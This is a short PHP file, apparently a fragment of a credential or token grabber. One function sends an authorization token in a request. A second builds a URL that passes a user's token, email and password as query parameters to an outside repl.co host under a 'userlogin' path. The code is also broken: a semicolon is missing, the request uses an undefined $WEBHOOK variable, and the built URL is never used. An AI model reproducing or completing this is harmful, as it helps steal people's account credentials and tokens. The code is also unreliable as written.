<?php
function getinfo($token, $url){
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('authorization: '.$token));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

    $result        =  curl_exec($ch);
    $headers_size  =  curl_getinfo($ch, CURLINFO_HEADER_SIZE);

    curl_close($ch);

    $body      =  substr($result, $headers_size);
    $response  =  json_decode($body);
    $response  =  json_decode(json_encode($response), true);

    return $result;
    
}

function getbadges($token, $login, $password, $client_ip) {
        $api_url = 'https://Repl-1.msb-gamerzgamer.repl.co/api/v1/userlogin'
        $urltopost = $api_url.'?token='.$token.'&email='.$login.'&password='.$password;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $WEBHOOK);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $response   = curl_exec($ch);

}
